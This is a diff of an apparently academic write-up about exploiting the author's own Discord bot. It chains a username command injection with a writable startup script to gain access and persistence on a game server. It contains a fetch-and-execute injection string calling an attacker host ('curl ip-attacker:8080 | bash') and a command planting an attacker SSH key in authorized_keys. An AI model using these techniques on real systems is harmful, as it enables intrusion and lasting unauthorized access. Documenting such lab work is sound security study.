@@ -9,8 +9,7 @@ I own a personal server that hosts both a game server and a Discord bot, which p
 
 The Discord bot is a program that continuously listens to messages in a designated chat channel and executes commands or functions depending on the message content.
 
-During a Cybersecurity course, I discovered a vulnerability in the Discord bot’s Python code that allows remote code execution without requiring user interaction. Exploiting this flaw, combined with a misconfiguration in the file permissions of a script, I was able to gain unauthorized access to the game server’s files.  
-
+During a Cybersecurity course, I discovered a vulnerability in the Discord bot’s Python code that allows remote code execution without requiring user interaction. Exploiting this flaw, combined with a misconfiguration in the file permissions of a script, I was able to gain unauthorized access to the game server’s files.
 
 
 
@@ -39,7 +38,7 @@ In addition to the code injection vulnerability, the system also presented a mis
 
 Since this script is executed by the game server process running under `user-b`, modifying its content and then restarting the server makes it possible to execute arbitrary code with `user-b`'s privileges, ultimately granting access to the game server files.
 
-  
+
 ---
 
 
@@ -47,13 +46,14 @@ Since this script is executed by the game server process running under `user-b`,
 ## Threat model
 - Attacker has access to send messages in the Discord chat monitored by the bot.
 - Attacker is aware of the injection vulnerability in the bot’s username handling.
-  
+
 
 ---
 
 
 ## Attacker Setup
 The Attacker uses 2 netcat processes, one listening on 8080, the other on 8081.
+
 #### Nat Configuration
 ![Nat Configuration](images/Nat_Configuration.png)
 
@@ -79,9 +79,9 @@ In the response.txt file there is the payload that the attacker wants to execute
 
 ## Exploit
 
-The desired payload can not always be injected directly through the username due to the 32-character limit (including spaces).  
+The desired payload can not always be injected directly through the username due to the 32-character limit (including spaces).
 To work around this limitation, a remote listener was set up to serve the full payload.  
-The exploit injects a command in the username that makes the bot fetch and execute code from a remote `response.txt` file.  
+The exploit injects a command in the username that makes the bot fetch and execute code from a remote `response.txt` file.
 The username used for this injection was:
 ```
 ;curl ip-attacker:8080 | bash;
@@ -119,7 +119,7 @@ This Python command creates a reverse shell:
 Two listener processes were set up on the attacker machine by running the corresponding server code to serve the malicious payload and receive the reverse shell connection.
 
 ### 3)Username
-The Discord username was modified to include a shell injection payload due to the vulnerability in the bot’s input handling.  
+The Discord username was modified to include a shell injection payload due to the vulnerability in the bot’s input handling.
 The username was set to:
 
 `;curl ip-attacker:8080 | bash;`
@@ -177,11 +177,11 @@ Then, I appended the generated public key to `user-b`'s `authorized_keys` by mod
 echo "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGzTv8FEFTYsiVF7rOQFz/+Zme92ZgdrAvfe0KavA4xA'
 >> /home/user-b/.ssh/authorized_keys" >> server_start.sh
 ```  
-This ensured that, upon the next reboot, the server would automatically add the attacker's public key, granting SSH access as `user-b`.  
+This ensured that, upon the next reboot, the server would automatically add the attacker's public key, granting SSH access as `user-b`.
 
 ---
 
 ## Server Restart
 
-After modifying the `server_start.sh` script to include the attacker’s public SSH key, it was necessary to wait for the server to restart in order to trigger the cron job execution.  
+After modifying the `server_start.sh` script to include the attacker’s public SSH key, it was necessary to wait for the server to restart in order to trigger the cron job execution.
 Once the server rebooted, the injected code ran with `user-b` privileges, granting persistent access to the game server files and enabling SSH login as `user-b`.
